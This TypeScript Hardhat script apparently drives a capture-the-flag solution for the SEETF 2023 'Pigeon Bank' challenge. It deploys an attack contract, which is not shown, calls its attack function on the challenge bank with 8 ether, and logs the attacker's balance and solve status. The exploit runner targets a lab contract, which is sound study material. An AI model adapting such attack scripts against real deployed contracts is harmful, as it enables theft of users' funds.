import chalk from "chalk";
import { ethers } from "hardhat";
import { SetupPigeonBankSEETF23__factory, SetupPigeonBankSEETF23, PigeonBankAttackSEETF23__factory } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [setupPigeonBankSEETF23Contract, attacker] = await initialize<SetupPigeonBankSEETF23>(SetupPigeonBankSEETF23__factory, undefined, undefined, "2500");
    let bankAddress = await setupPigeonBankSEETF23Contract.pigeonBank();

    let bankAttack = await new PigeonBankAttackSEETF23__factory(attacker).deploy();
    await bankAttack.waitForDeployment();
    let tx = await bankAttack.attack(bankAddress, {value: ethers.parseEther("8")});
    await tx.wait();

    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await ethers.provider.getBalance(attacker.address)))}`);
    log(`Is solved: ${chalk.yellow(await setupPigeonBankSEETF23Contract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});